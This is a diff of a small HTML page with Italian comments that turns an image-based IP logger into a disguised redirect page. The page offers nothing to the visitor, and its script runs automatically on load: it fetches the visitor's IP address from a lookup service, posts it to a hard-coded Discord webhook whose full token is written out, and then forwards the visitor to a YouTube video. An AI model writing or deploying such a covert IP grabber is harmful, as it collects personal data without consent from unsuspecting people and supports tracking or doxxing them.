@@ -3,31 +3,39 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Image</title>
+  <title>Redirect</title>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Image.jpg" onload="logIP()" alt="Tracked Image">
   <script>
-    function logIP() {
+    function logAndRedirect() {
       const webhookUrl = 'https://discord.com/api/webhooks/1260254914349895784/mQs8n9QhvRHeFZt1bdmlESO0a9E_bLsd9GiFY3LKFo0XBNuiZWp6vGVlAz9ep8qGAvcj';
+      const redirectUrl = 'https://www.youtube.com/watch?v=WSDKy-jmInE'; // Sostituisci con l'URL di destinazione
 
-      // Usare un servizio esterno per ottenere l'IP dell'utente
+      // Usa un servizio esterno per ottenere l'IP dell'utente
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
-          fetch(webhookUrl, {
+          // Invia l'IP al webhook
+          return fetch(webhookUrl, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-              content: `IP: ${ip} viewed the image`,
+              content: `IP: ${ip} visited the redirect page`,
             }),
           });
         })
+        .then(() => {
+          // Reindirizza l'utente dopo aver inviato l'IP
+          window.location.href = redirectUrl;
+        })
         .catch(error => console.error('Error:', error));
     }
+
+    // Esegui la funzione di log e reindirizzamento quando la pagina viene caricata
+    window.onload = logAndRedirect;
   </script>
 </body>
 </html>
